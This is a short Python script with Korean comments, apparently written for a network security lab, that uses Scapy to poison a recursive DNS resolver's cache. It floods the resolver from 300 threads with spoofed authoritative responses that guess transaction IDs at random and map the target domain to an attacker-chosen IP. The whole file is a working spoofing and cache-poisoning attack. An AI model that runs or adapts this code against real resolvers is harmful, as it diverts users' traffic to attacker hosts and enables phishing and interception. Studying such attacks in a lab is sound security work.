import threading
import random
from scapy.all import *

# 공격 대상 환경 설정
RESOLVER_IP = "192.168.56.102"     # Recursive DNS 서버 IP
RESOLVER_PORT = 33333              # Recursive DNS 포트
AUTH_DNS_IP = "192.168.56.104"     # 권한 DNS 서버 IP
TARGET_DOMAIN = "rand9999.netsec.kr"
POISON_IP = "1.1.1.1"              # 공격자가 주입할 가짜 IP

# 공격 쓰레드 및 패킷 설정
THREAD_COUNT = 300                 # 동시 실행할 쓰레드 수
PACKETS_PER_THREAD = 10000         # 각 쓰레드가 보낼 패킷 수

# forged response (위조 응답) 생성 함수
def build_forged_response(txid):
    dns_response = IP(src=AUTH_DNS_IP, dst=RESOLVER_IP) / \
                   UDP(sport=53, dport=RESOLVER_PORT) / \
                   DNS(
                       id=txid,
                       qr=1, aa=1, ra=1, rd=1,
                       qd=DNSQR(qname=TARGET_DOMAIN),
                       an=DNSRR(rrname=TARGET_DOMAIN, type="A", rdata=POISON_IP, ttl=600),
                       ns=DNSRR(rrname=TARGET_DOMAIN, type="NS", rdata="rand9999.net.", ttl=600),
                       ar=DNSRR(rrname="rand9999.netsec.kr.", type="A", rdata=POISON_IP, ttl=600)
                   )
    return dns_response

# 각 쓰레드에서 패킷을 반복 전송하는 공격 함수
def attack_thread():
    for _ in range(PACKETS_PER_THREAD):
        txid = random.randint(0, 65535)
        pkt = build_forged_response(txid)
        send(pkt, verbose=0)

# 메인 실행부: 다수 쓰레드를 동시 실행
if __name__ == "__main__":
    threads = []
    for _ in range(THREAD_COUNT):
        t = threading.Thread(target=attack_thread)
        t.start()
        threads.append(t)

    for t in threads:
        t.join()

    print("Attack completed.")
